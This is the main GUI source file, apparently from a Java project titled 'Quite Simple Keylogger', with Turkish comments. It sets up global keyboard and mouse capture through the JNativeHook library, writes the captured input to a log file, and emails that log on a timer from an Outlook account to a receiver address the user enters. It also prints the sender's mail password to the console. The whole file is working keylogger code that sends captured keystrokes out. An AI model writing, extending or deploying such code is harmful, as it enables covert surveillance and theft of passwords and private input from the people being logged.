import javax.swing.BorderFactory;
import javax.swing.ButtonGroup;
import javax.swing.JButton;
import javax.swing.JRadioButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;
import javax.swing.SwingConstants;

import java.awt.GridLayout;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;

// ana classımız (grafiksel arayüz)
public class Main implements ActionListener {
    public static void main(String[] args) {
        new Main();
    }
    // GUI'yi oluşturan ve fonksiyonel program üzerinde kullanılacak görsel elemanlar
    public static final JFrame frame = new JFrame();
    private final JRadioButton onlyMouseRB = new JRadioButton("Sadece Fare");
    private final JRadioButton onlyKeyboardRB = new JRadioButton("Sadece Klavye");
    private final JRadioButton bothRB = new JRadioButton("Her ikisi");
    private final JTextField mailCooldownField = new JTextField();
    private final JTextField receiverMailField = new JTextField();
    private final JTextField maxFileSizeField = new JTextField();
    private final JTextField senderMailField = new JTextField();
    private final JPasswordField senderMailPasswordField = new JPasswordField();
    private final JButton startButton = new JButton("Başlat");
    private final JButton stopButton = new JButton("Durdur");
    
    // bazı işlemler için önhazırlığı yapılan değişkenler
    private boolean listenMouse = false;
    private boolean listenKeyboard = false;
    public static boolean isKeylogging = false; // ancak true olduğunda mail atılacak

    Keyboard keyboard=new Keyboard(); // kullanıcı klavyesi
    Mouse mouse=new Mouse();          // kullanıcı faresi

    // program çalıştığında önümüze çıkan pencereyi oluşturan constructor
    Main() {
        // GlobalScreen ile Swing'in ayrı threadlerde çalıştırılması (öbür türlü program hatalı çalışır)
        GlobalScreen.setEventDispatcher(new SwingDispatchService());

        // kutucuk ayarları ve kutucuklara dinleyici ekleme
        ButtonGroup RBgroup = new ButtonGroup(); // kutucukları bir buttongroup'a eklemek onların aynı anda seçilmesini önler
        RBgroup.add(onlyKeyboardRB);
        RBgroup.add(onlyMouseRB);
        RBgroup.add(bothRB);
        onlyMouseRB.setHorizontalAlignment(SwingConstants.CENTER);
        onlyKeyboardRB.setHorizontalAlignment(SwingConstants.CENTER);
        bothRB.setHorizontalAlignment(SwingConstants.CENTER);
        onlyMouseRB.addActionListener(this);
        onlyKeyboardRB.addActionListener(this);
        bothRB.addActionListener(this);

        // buton ayarları ve dinleyici ekleme
        stopButton.setEnabled(false);
        startButton.addActionListener(this);
        stopButton.addActionListener(this);

        // metin kutularını hazırlama:
        mailCooldownField.setText("5"); // varsayılan mail gönderme aralığı 5 dakika
        maxFileSizeField.setText("25"); // varsayılan max dosya boyutu 25 mb

        // en üst panel (metin kutularının olduğu alan) ayarları
        JPanel upperPanel = new JPanel(new GridLayout(5, 2, 0, 10));
        upperPanel.setBorder(BorderFactory.createEmptyBorder(20,30,0,30));
        upperPanel.add(new JLabel("Mail gönderme aralığı (dk):"));
        upperPanel.add(mailCooldownField);
        upperPanel.add(new JLabel("Alıcı mail adresi:"));
        upperPanel.add(receiverMailField);
        upperPanel.add(new JLabel("Maks. log dosyası boyutu (MB) [en fazla 25]:"));
        upperPanel.add(maxFileSizeField);
        upperPanel.add(new JLabel("Gönderici mail adresi (outlook):"));
        upperPanel.add(senderMailField);
        upperPanel.add(new JLabel("Gönderici mail şifresi:"));
        upperPanel.add(senderMailPasswordField);

        // orta panel (kutucukların olduğu alan) ayarları
        JPanel middlePanel = new JPanel(new GridLayout(1, 3, 10, 10));
        middlePanel.setBorder(BorderFactory.createEmptyBorder(5,5,5,5));
        middlePanel.add(onlyMouseRB);
        middlePanel.add(onlyKeyboardRB);
        middlePanel.add(bothRB);

        // alt panel (tuşların olduğu alan) ayarları
        JPanel lowerPanel = new JPanel(new GridLayout(1, 2, 150, 10));
        lowerPanel.setBorder(BorderFactory.createEmptyBorder(40,150,40,150));
        lowerPanel.add(startButton);
        lowerPanel.add(stopButton);

        // bütün panelleri içeren ana pencere ayarları
        frame.setLayout(new GridLayout(3,1));
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setTitle("Quite Simple Keylogger");
        frame.setResizable(false);
        frame.setSize(800,500);
        frame.add(upperPanel);
        frame.add(middlePanel);
        frame.add(lowerPanel);
        frame.setVisible(true);
    }

    // GUI'ye girilen hataları kontrol edip hata mesajı oluşturma
    private String checkInputErrors() {
        StringBuilder errorText = new StringBuilder();

        // Mail Gönderme aralığı metin kutusunun kontrolü
        try {
            int mailCooldown = Integer.parseInt(mailCooldownField.getText());
            if(mailCooldown<0) {
                throw new NumberFormatException();
            }
        } catch(NumberFormatException ex) {
            errorText.append("- Mail gönderme aralığı yanlış.\n");
        }

        // Alıcı Mail Adresi metin kutusunun kontrolü
        String receiverMail = receiverMailField.getText();
        if(!(receiverMail.contains("@") && receiverMail.contains("."))) {
            errorText.append("- Alıcı mail adresi doğru değil.\n");
        }

        // Max Log Dosyası Boyutu metin kutusunun kontrolü
        try {
            int maxFileSize = Integer.parseInt(maxFileSizeField.getText());
            if(maxFileSize<=0 || maxFileSize>25) {
                throw new NumberFormatException();
            }
        } catch(NumberFormatException ex) {
            errorText.append("- Log dosyası boyutu yanlış.\n");
        }

        // Alıcı Mail Adresi metin kutusunun kontrolü
        String senderMail = senderMailField.getText();
        if(!senderMail.endsWith("@outlook.com")) {
            errorText.append("- Gönderici mail adresi doğru değil.\n");
        }

        // Alıcı Mail Şifresi metin kutusunun kontrolü
        String senderMailPass = new String(senderMailPasswordField.getPassword());
        if(senderMailPass.isEmpty()) {
            errorText.append("- Gönderici mail şifresi girilmedi.\n");
        }

        // Kutucukların (dinleme metotlarının) en az birinin seçildiğini kontrol etme
        if(!onlyKeyboardRB.isSelected() && !onlyMouseRB.isSelected() && !bothRB.isSelected()) {
            errorText.append( "- Dinleme metodu seçilmedi.\n");
        }

        return errorText.toString();
    }

    // tuşlara veya kutucuklara basıldığında olacaklar (GUI'nin ana kodu etkileyen kısmı)
    @Override
    public void actionPerformed(ActionEvent e) {
        // başlat tuşuna basıldığında olacaklar
        if(e.getSource() == startButton) {
            String errorText = "";
            try {
                // hangi kutucuk basılmışsa ona göre dinleme ayarı yapılması
                if(onlyMouseRB.isSelected()) {
                    listenMouse = true;
                    listenKeyboard = false;
                }
                else if(onlyKeyboardRB.isSelected()) {
                    listenMouse = false;
                    listenKeyboard = true;
                }
                else if(bothRB.isSelected()) {
                    listenMouse = true;
                    listenKeyboard = true;
                }

                // hata mesajı olduğu taktirde program hatası oluştur
                errorText += checkInputErrors();
                if(!errorText.isEmpty()) {
                    throw new RuntimeException();
                }

                // hata olmadığında girilen girdiler alınır
                int mailCooldown = Integer.parseInt(mailCooldownField.getText());
                String receiverMail = receiverMailField.getText();
                int maxFileSize = Integer.parseInt(maxFileSizeField.getText());
                String senderMail = senderMailField.getText();
                String senderMailPass = new String(senderMailPasswordField.getPassword());

                // girdiler terminale de yazdırılır
                System.out.println("Mail cooldown in minutes: " + mailCooldown);
                System.out.println("Target mail address: "+ receiverMail);
                System.out.println("Alternative mail adress: "+senderMail);
                System.out.println("Alternative mail password: "+senderMailPass);
                System.out.println("Max log file size in MBs: " + maxFileSize);
                System.out.println("Keyboard listening: " + listenKeyboard);
                System.out.println("Mouse listening: " + listenMouse);
                System.out.println("Keylogging started.");

                // keyloggerı başlatma
                StartKeylogging(listenMouse, listenKeyboard, mailCooldown, receiverMail, maxFileSize, senderMail, senderMailPass);

                // başlata bastığımız için başlat tuşunu kilitleyip durdur tuşunun kilidini açma
                startButton.setEnabled(false);
                stopButton.setEnabled(true);
            }
            // hataları kullanıcıya ayrı bir pencerede göster
            catch(RuntimeException ex) {
                JOptionPane.showMessageDialog(frame, errorText, "Input Errors", JOptionPane.ERROR_MESSAGE);
            }
        }

        // durdur tuşuna basınca olacaklar
        else if(e.getSource() == stopButton) {
            System.out.println("Keylogger stopped.");

            // keyloggerı durdurma
            StopKeylogging();

            // durdura bastığımız için durdur tuşunu kilitleyip başlat tuşunun kilidini açma
            startButton.setEnabled(true);
            stopButton.setEnabled(false);
        }       
    }

    // keyloggerı çalıştırma/başlatma
    private void StartKeylogging(boolean listenMouse, boolean listenKeyboard, int mailCooldown, String receiverMail, int maxFileSize, String senderMail, String senderMailPass) {
        isKeylogging = true;

        // kullanıcı nasıl istemişse o elemanları dinlemeyi başlatma
        if(listenKeyboard && !listenMouse){
            keyboard.StartListening();
        }
        else if(!listenKeyboard && listenMouse) {
            mouse.StartListening();
        }
        else {
            keyboard.StartListening();
            mouse.StartListening();
        }

        // bir log dosyası oluşturma
        LogFile.CreateFile(maxFileSize);

        // aralıklı mail gönderme
        MailSender.sendScheduledEMail(mailCooldown,receiverMail, senderMail, senderMailPass);
    }

    // keyloggerı durdurma
    private void StopKeylogging() {
        isKeylogging = false;
        keyboard.StopListening();
        mouse.StopListening();
    }
}